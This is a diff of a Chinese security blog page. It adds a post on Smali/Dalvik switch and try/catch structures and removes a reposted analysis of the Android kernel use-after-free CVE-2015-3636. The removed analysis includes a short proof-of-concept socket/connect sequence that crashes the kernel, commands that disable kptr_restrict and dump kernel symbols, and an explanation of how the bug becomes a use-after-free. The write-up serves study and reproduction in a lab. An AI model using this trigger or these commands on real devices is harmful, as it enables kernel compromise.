baby"</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">15</span>: </span><br><span class="line">      <span class="keyword">return</span> <span class="string">"he is a student"</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">35</span>: </span><br><span class="line">      <span class="keyword">return</span> <span class="string">"he is a father"</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">65</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"he is a grandpa"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//部分smali代码</span></span><br><span class="line">.<span class="function">method <span class="keyword">private</span> <span class="title">sparseSwitch</span><span class="params">(I)</span>Ljava/lang/String</span>;</span><br><span class="line">.................</span><br><span class="line">    sparse-switch p1, :sswitch_data_0	#sparse-switch分支，sswitch_data_0指定case区域</span><br><span class="line">    const-string v0, "he is a person"	#case default</span><br><span class="line">    :goto_0								#case出口</span><br><span class="line">    return-object v0					#返回字符串</span><br><span class="line">    .line <span class="number">46</span></span><br><span class="line">    :sswitch_0</span><br><span class="line">    <span class="keyword">const</span>-string v0, <span class="string">"he is a baby"</span></span><br><span class="line">    .line <span class="number">47</span></span><br><span class="line">    goto :goto_0</span><br><span class="line">    nop</span><br><span class="line">    :sswitch_data_0</span><br><span class="line">    .sparse-switch						#case区域</span><br><span class="line">        0x5 -&gt; :sswitch_0				#case	5</span><br><span class="line">        0xf -&gt; :sswitch_1				#case	15</span><br><span class="line">        0x23 -&gt; :sswitch_2				#case 	35</span><br><span class="line">        0x41 -&gt; :sswitch_3				#case	65</span><br><span class="line">    .end sparse-<span class="keyword">switch</span></span><br><span class="line">.end method</span><br></pre></td></tr></table></figure>
+<p>sparse-switch指令在Dalvik中的格式如下：<code>sparse-switch vAA, +BBBBBBBB</code></p>
+<p>指令后面的“<code>+BBBBBBBB</code>”被指明为一个<code>sparse-switch-payload</code>格式的偏移。它的格式如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">struct sparse-switch-payload&#123;</span><br><span class="line">    ushort	ident;		//值固定为0x0100</span><br><span class="line">    ushort	size;		//case数目</span><br><span class="line">    int[]	keys;		//每个case的值，顺序从低到高</span><br><span class="line">    int[]	targets;	//每个case相对switch指令处的偏移</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p><img src="/2018/08/19/对比Java代码结构与Smali代码/3.png" alt="3"></p>
+<p>IDA Pro找到“<code>sparse-switch p1, :sswitch_data_0</code>”指令位于0x2cb6a处，相应的机器码为“<code>2C 02 13 00 00 00</code>”，2C为<code>sparse -switch</code>的OpCode,<code>02</code>为寄存器p1,<code>00000013</code>为偏移量0x13。因为实际该指令指向的sparse-switch-payload结构体的偏移量为<code>0x2cb6a + 2 * 0x13 = 0x2cb90</code></p>
+<p><img src="/2018/08/19/对比Java代码结构与Smali代码/4.png" alt="4"></p>
+<ul>
+<li>第1个ident字段为0x200,标识sparse-switch有效的case区域</li>
+<li>第2个字段size为4，表明有4个case。</li>
+<li>第3个字段keys为4个case的值，分别为0x5、0xf、0x23、0x41。</li>
+<li>第4个字段为偏移量，分别为0x6、0x9、0xc、0xf，加上sparse -switch偏移值0x2cb6a<ul>
+<li>case 0位置 =<code>0x2cb6a + 2 * 0x6 = 0x2cb76</code></li>
+<li>case 1位置 = <code>0x2cb6a + 2 * 0x9 = 0x2cb7c</code></li>
+<li>case 2位置 = <code>0x2cb6a + 2 * 0xc = 0x2cb82</code></li>
+<li>case 3位置 = <code>0x2cb6a + 2 * 0xf = 0x2cb88</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="3-try-catch语句"><a href="#3-try-catch语句" class="headerlink" title="3.try/catch语句"></a>3.try/catch语句</h3><p>try语句块使用<strong>try_start_开头的标号注明，以try_end_开头的标号结束</strong>。第一个try语句的开头标号为try_start_0，结束标号为try_end_0</p>
+<p>try_end_0标号下面使用“.catch”指令指定处理到的异常类型与catch的标号，格式如下</p>
+<p><em>.catch &lt;异常类型&gt; {\&lt;try起始标号&gt; .. \&lt;try结束标号&gt;} \&lt;catch标号&gt;</em></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexCode</span>&#123;</span></span><br><span class="line">    u2	registersSize;	<span class="comment">//使用的寄存器个数</span></span><br><span class="line">    u2	insSize;		<span class="comment">//参数个数</span></span><br><span class="line">    u2	outsSize;		<span class="comment">//调用其他方法时使用的寄存器个数</span></span><br><span class="line">    u2	triesSize;		<span class="comment">//Try/Catch个数</span></span><br><span class="line">    u4	debugInfoOff;	<span class="comment">//指向调试信息的偏移</span></span><br><span class="line">    u4	insnsSize;		<span class="comment">//指令集个数，以2字节为单位</span></span><br><span class="line">    u2	insns[<span class="number">1</span>];		<span class="comment">//指令集</span></span><br><span class="line">    <span class="comment">//2字节空间用于结构对齐</span></span><br><span class="line">    <span class="comment">//try_item[triesSize]	DexTry结构</span></span><br><span class="line">    <span class="comment">//Try/Catch中handler的个数</span></span><br><span class="line">    <span class="comment">//catch_handler_item[handlersSize],DexCatchHandler结构</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//该结构下面的try_item就保存了try语句的信息</span></span><br><span class="line"><span class="comment">//它的结构DexTry声明如下</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexTry</span>&#123;</span></span><br><span class="line">    u4	startAddr;		<span class="comment">//起始地址</span></span><br><span class="line">    u2	insnCount;		<span class="comment">//指令数量</span></span><br><span class="line">    u2	handlerOff;		<span class="comment">//handler的偏移</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//dexdump classes.dex &gt; xx.txt</span></span><br><span class="line"><span class="comment">//dexdump 位置 Android\build-tools\28.0.1里</span></span><br><span class="line">#<span class="number">1</span>              : (in Lcom/droider/trycatch/MainActivity;)</span><br><span class="line">      name          : 'tryCatch'</span><br><span class="line">      type          : '(ILjava/lang/String;)V'</span><br><span class="line">      access        : <span class="number">0x0002</span> (PRIVATE)					<span class="comment">//私有方法</span></span><br><span class="line">      code          -</span><br><span class="line">      registers     : <span class="number">13</span>								<span class="comment">//13个寄存器</span></span><br><span class="line">      ins           : <span class="number">3</span>									<span class="comment">//3个try语句块</span></span><br><span class="line">      outs          : <span class="number">3</span>	</span><br><span class="line">      insns size    : <span class="number">80</span> <span class="number">16</span>-bit code units				<span class="comment">//80条指令</span></span><br><span class="line">      catches       : <span class="number">3</span></span><br><span class="line">        <span class="number">0x0001</span> - <span class="number">0x0004</span></span><br><span class="line">          Ljava/lang/NumberFormatException; -&gt; <span class="number">0x0045</span></span><br><span class="line">        <span class="number">0x0005</span> - <span class="number">0x0038</span>									<span class="comment">//2个异常处理handler</span></span><br><span class="line">          Ljava/lang/ArithmeticException; -&gt; <span class="number">0x0039</span></span><br><span class="line">          Ljava/lang/NumberFormatException; -&gt; <span class="number">0x0045</span></span><br><span class="line">        <span class="number">0x003a</span> - <span class="number">0x0044</span></span><br><span class="line">          Ljava/lang/NumberFormatException; -&gt; <span class="number">0x0045</span></span><br></pre></td></tr></table></figure>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">Android</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/08/19/对比Java代码结构与Smali代码/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-Android中的静态分析" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -1302,619 +1809,6 @@
 
 
   
-    <article id="post-CVE-2015-3636" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/08/14/CVE-2015-3636/">CVE-2015-3636</a>
-    </h1>
-  
-
-        
-        <a href="/2018/08/14/CVE-2015-3636/" class="archive-article-date">
-  	<time datetime="2018-08-14T07:35:15.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-14</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="CVE-2015-3636-pingpong-root-android内核-UAF漏洞分析【转】"><a href="#CVE-2015-3636-pingpong-root-android内核-UAF漏洞分析【转】" class="headerlink" title="CVE-2015-3636(pingpong root)android内核 UAF漏洞分析【转】"></a>CVE-2015-3636(pingpong root)android内核 UAF漏洞分析【转】</h3><ul>
-<li>在看雪中随便翻翻，看到CVE-2015-3636，决定跟着复现做一遍~</li>
-<li>网上已有很多分析3636的文章，原理也有很多、本文转自看雪<a href="https://bbs.pediy.com/thread-230298.htm" target="_blank" rel="noopener">原文</a></li>
-</ul>
-<ul>
-<li><p>这个<a href="https://www.blackhat.com/docs/us-15/materials/us-15-Xu-Ah-Universal-Android-Rooting-Is-Back-wp.pdf" target="_blank" rel="noopener">漏洞</a>keen在blackhat上讲过，是一个很经典的android内核漏洞，也是第一个64bit root，还是很有学习价值的。</p>
-</li>
-<li><p>分析android内核的漏洞需要自己下载android源代码和内核源代码，reverse patch，编译调试。吾爱破解有个比赛就是写这个漏洞的exploit，并且还提供了相应的环境。<a href="https://www.52pojie.cn/thread-480759-1-1.html" target="_blank" rel="noopener">吾爱破解2016安全挑战赛</a></p>
-</li>
-<li><p>把内核源代码下载下来看看=</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://aosp.tuna.tsinghua.edu.cn/kernel/common.git</span><br><span class="line">git checkout remotes/origin/android-3.4 -b android-3.4</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>当调用socket(AF_INET,SOCK_DGRAM,IPPROTO_ICMP)创建socket再调用connect时，在内核中调用到了inet_dgram_connect</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">inet_dgram_connect</span><span class="params">(struct socket *sock, struct sockaddr * uaddr,</span></span></span><br><span class="line"><span class="function"><span class="params">               <span class="keyword">int</span> addr_len, <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span> = <span class="title">sock</span>-&gt;<span class="title">sk</span>;</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (addr_len &lt; <span class="keyword">sizeof</span>(uaddr-&gt;sa_family))</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    <span class="keyword">if</span> (uaddr-&gt;sa_family == AF_UNSPEC)</span><br><span class="line">        <span class="keyword">return</span> sk-&gt;sk_prot-&gt;disconnect(sk, flags);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (!inet_sk(sk)-&gt;inet_num &amp;&amp; inet_autobind(sk))</span><br><span class="line">        <span class="keyword">return</span> -EAGAIN;</span><br><span class="line">    <span class="keyword">return</span> sk-&gt;sk_prot-&gt;connect(sk, (struct sockaddr *)uaddr, addr_len);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(inet_dgram_connect);</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>如果sa_family==AF_UNSPEC会根据协议类型调用相应的disconnect routine，对于PROTO_ICMP来说就是udp_disconnect</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">udp_disconnect</span><span class="params">(struct sock *sk, <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">inet_sock</span> *<span class="title">inet</span> = <span class="title">inet_sk</span>(<span class="title">sk</span>);</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 1003.1g - break association.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"> </span><br><span class="line">    sk-&gt;sk_state = TCP_CLOSE;</span><br><span class="line">    inet-&gt;inet_daddr = <span class="number">0</span>;</span><br><span class="line">    inet-&gt;inet_dport = <span class="number">0</span>;</span><br><span class="line">    sock_rps_reset_rxhash(sk);</span><br><span class="line">    sk-&gt;sk_bound_dev_if = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (!(sk-&gt;sk_userlocks &amp; SOCK_BINDADDR_LOCK))</span><br><span class="line">        inet_reset_saddr(sk);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (!(sk-&gt;sk_userlocks &amp; SOCK_BINDPORT_LOCK)) &#123;</span><br><span class="line">        sk-&gt;sk_prot-&gt;unhash(sk);</span><br><span class="line">        inet-&gt;inet_sport = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    sk_dst_reset(sk);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(udp_disconnect);</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>最终会调用到ping_unhash</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ping_unhash</span><span class="params">(struct sock *sk)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">inet_sock</span> *<span class="title">isk</span> = <span class="title">inet_sk</span>(<span class="title">sk</span>);</span></span><br><span class="line">    pr_debug(<span class="string">"ping_unhash(isk=%p,isk-&gt;num=%u)\n"</span>, isk, isk-&gt;inet_num);</span><br><span class="line">    <span class="keyword">if</span> (sk_hashed(sk)) &#123;</span><br><span class="line">        write_lock_bh(&amp;ping_table.lock);</span><br><span class="line">        hlist_nulls_del(&amp;sk-&gt;sk_nulls_node);</span><br><span class="line">        sk_nulls_node_init(&amp;sk-&gt;sk_nulls_node);</span><br><span class="line">        sock_put(sk);</span><br><span class="line">        isk-&gt;inet_num = <span class="number">0</span>;</span><br><span class="line">        isk-&gt;inet_sport = <span class="number">0</span>;</span><br><span class="line">        sock_prot_inuse_add(sock_net(sk), sk-&gt;sk_prot, <span class="number">-1</span>);</span><br><span class="line">        write_unlock_bh(&amp;ping_table.lock);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL_GPL(ping_unhash);</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>如果sk_hashed条件成立，则会调用hlist_nulls_del在一个双向链表hlist中删除sk_nulls_node</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> __hlist_nulls_del(struct hlist_nulls_node *n)</span><br><span class="line">&#123;</span><br><span class="line">         <span class="class"><span class="keyword">struct</span> <span class="title">hlist_nulls_node</span> *<span class="title">next</span> = <span class="title">n</span>-&gt;<span class="title">next</span>;</span></span><br><span class="line">         <span class="class"><span class="keyword">struct</span> <span class="title">hlist_nulls_node</span> **<span class="title">pprev</span> = <span class="title">n</span>-&gt;<span class="title">pprev</span>;</span></span><br><span class="line">         *pprev = next;</span><br><span class="line">         <span class="keyword">if</span> (!is_a_nulls(next))</span><br><span class="line">                   next-&gt;pprev = pprev;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">hlist_nulls_del</span><span class="params">(struct hlist_nulls_node *n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">         __hlist_nulls_del(n);</span><br><span class="line">         n-&gt;pprev = LIST_POISON2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>当n也就是sk_nulls_node被删除之后n-&gt;pprev被设置为LIST_POISON2，值是固定的0x200200。</p>
-</li>
-<li><p>看以下第二次connect的时候sk_hashed条件是否成立</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">sk_unhashed</span><span class="params">(<span class="keyword">const</span> struct sock *sk)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">         <span class="keyword">return</span> hlist_unhashed(&amp;sk-&gt;sk_node);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">sk_hashed</span><span class="params">(<span class="keyword">const</span> struct sock *sk)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">         <span class="keyword">return</span> !sk_unhashed(sk);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">hlist_unhashed</span><span class="params">(<span class="keyword">const</span> struct hlist_node *h)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">         <span class="keyword">return</span> !h-&gt;pprev;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>可以注意到sk_node和sk_nulls_node共用一个union，两者的定义也十分类似。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> sk_node            __sk_common.skc_node</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> sk_nulls_node      __sk_common.skc_nulls_node</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">hlist_node</span>  <span class="title">skc_node</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">hlist_nulls_node</span> <span class="title">skc_nulls_node</span>;</span></span><br><span class="line">    &#125;;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hlist_node</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hlist_node</span> *<span class="title">next</span>, **<span class="title">pprev</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hlist_nulls_node</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hlist_nulls_node</span> *<span class="title">next</span>, **<span class="title">pprev</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-<p>虽然设置的是sk_nulls_node-&gt;pprev判断的是sk_node-&gt;pprev，但实际上相同；</p>
-<p>sk_hashed条件成立，再次删除已经删除的对象，执行*pprev=next时pprev已经是0x200200</p>
-<p>如果这个地址没有映射到用户态就会kernel panic。</p>
-</li>
-<li><p>keen给的POC</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> <span class="title">addr</span> = &#123;</span> .sa_family = AF_INET &#125;;</span><br><span class="line"><span class="keyword">int</span> ret = connect(sockfd, &amp;addr, <span class="keyword">sizeof</span>(addr));</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> _<span class="title">addr</span> = &#123;</span> .sa_family = AF_UNSPEC &#125;;</span><br><span class="line">ret = connect(sockfd, &amp;_addr, <span class="keyword">sizeof</span>(_addr));</span><br><span class="line">ret = connect(sockfd, &amp;_addr, <span class="keyword">sizeof</span>(_addr));</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<p>poc中第一次AF_INET的connect是为了将sk加入hlist中。</p>
-<ul>
-<li>poc的效果</li>
-</ul>
-<p><img src="/2018/08/14/CVE-2015-3636/1.png" alt="1"></p>
-<p><img src="/2018/08/14/CVE-2015-3636/2.png" alt="2"></p>
-<p><code>Unable to handle kernel paging request at virtual address</code>的地址是0x1360而不是0x200200，可能出题的人在这里修改了一下。</p>
-<p>在IDA里面看看。如果采取自己编译调试的方式是可以加载vmlinux符号文件的，这里我们就只能自己从机器上得到函数地址和名称然后加载到IDA中了。把Image拖到IDA64中，Process type选择ARM Little-endian [ARM]。<img src="/2018/08/14/CVE-2015-3636/3.png" alt="3"></p>
-<p>把ROM start address和Loading address设置为0xFFFFFFC000080000(32位系统就是0xC0008000)。Android 8.0中才为4.4及以后的内核引入了KASLR，很显然我们这里没有KASLR，这个值是固定的。</p>
-<p><img src="/2018/08/14/CVE-2015-3636/4.png" alt="4"></p>
-<p>且选择64bit。</p>
-<p><img src="/2018/08/14/CVE-2015-3636/5.png" alt="5"></p>
-<p>在这个时候用IDA是什么也识别不出来的，因为Image文件并不是一个ELF，用binwalk看一下就会发现其实它组成还挺复杂。</p>
-<p>我们接下来从运行的虚拟机中导出内核函数名称和地址。在ubuntu这样的发行版和android内核中有<code>Kernel Address Display Restriction</code>，所以先把它关掉。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sh -c <span class="string">" echo 0 &gt; /proc/sys/kernel/kptr_restrict"</span></span><br><span class="line">cat /proc/kallsyms &gt; /data/<span class="built_in">local</span>/tmp/1.txt</span><br><span class="line">adb pull /data/<span class="built_in">local</span>/tmp/1.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2018/08/14/CVE-2015-3636/6.png" alt="6"></p>
-<p>写一个简答的idc脚本把这些函数名加载到IDA里面。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ksyms = open(<span class="string">"D:\\1.txt"</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> ksyms:</span><br><span class="line">    addr = int(line[<span class="number">0</span>:<span class="number">16</span>],<span class="number">16</span>)</span><br><span class="line">    name = line[<span class="number">19</span>:].replace(<span class="string">'_'</span>,<span class="string">''</span>)</span><br><span class="line">    name = line[<span class="number">19</span>:].replace(<span class="string">'\n'</span>,<span class="string">''</span>)</span><br><span class="line">    idc.MakeCode(addr)</span><br><span class="line">    idc.MakeFunction(addr)</span><br><span class="line">    idc.MakeName(addr,name)</span><br><span class="line">    Message(<span class="string">"%08X:%s"</span>%(addr,name))</span><br></pre></td></tr></table></figure>
-<p>出来的函数列表里面只有ping_hash没有ping_unhash。</p>
-<p>把ping_hash的End address改成0xFFFFFFC000409614。</p>
-<p>再在0xFFFFFFC000409614处create function处理一下就可以了。</p>
-<p><img src="/2018/08/14/CVE-2015-3636/7.png" alt="7"></p>
-<p>可以看到crash处0xFFFFFFC000409644和前后的代码。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ROM:FFFFFFC00040963C                 LDR             X1, [X19,#0x38]</span><br><span class="line">ROM:FFFFFFC000409640                 LDR             X0, [X19,#0x30]</span><br><span class="line">ROM:FFFFFFC000409644                 STR             X0, [X1]</span><br></pre></td></tr></table></figure>
-<p>这三行代码对应源代码中的下面三行：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hlist_nulls_node</span> *<span class="title">next</span> = <span class="title">n</span>-&gt;<span class="title">next</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hlist_nulls_node</span> **<span class="title">pprev</span> = <span class="title">n</span>-&gt;<span class="title">pprev</span>;</span></span><br><span class="line">*pprev = next;</span><br></pre></td></tr></table></figure>
-<p>进一步确认了漏洞成因和我们前面所分析的一样。主要参考如下：</p>
-<p><a href="http://www.hhjack.com/arm64_zimage_reverseengineering_with_ida_pro/" target="_blank" rel="noopener">逆向ARM64内核zlmage</a></p>
-<p><a href="https://blog.csdn.net/QQ1084283172/article/details/57074695" target="_blank" rel="noopener">从Android设备中提取内核和逆向分析</a></p>
-<ul>
-<li><p>接下来还是回到正题，既然说这是一个UAF漏洞那么哪里UAF了呢？在<code>hlist_nulls_del</code>之后还有一个<code>sock_put</code>。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Ungrab socket and destroy it, if it was the last reference. */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">sock_put</span><span class="params">(struct sock *sk)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (atomic_dec_and_test(&amp;sk-&gt;sk_refcnt))</span><br><span class="line">        sk_free(sk);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<ul>
-<li>sock_put将sk的引用计数减1，并且判断其值是否为0，如果为0的话就free掉sk</li>
-<li>可以想到最后一次connect进入本不该进入的if分支之后如果我们提前mmap了0x200200(这里是0x1360)就不会崩溃，接下来进入sock_put，引用计数变成0，sk被free掉，但是文件描述符还在用户空间，这就造成了UAF。</li>
-</ul>
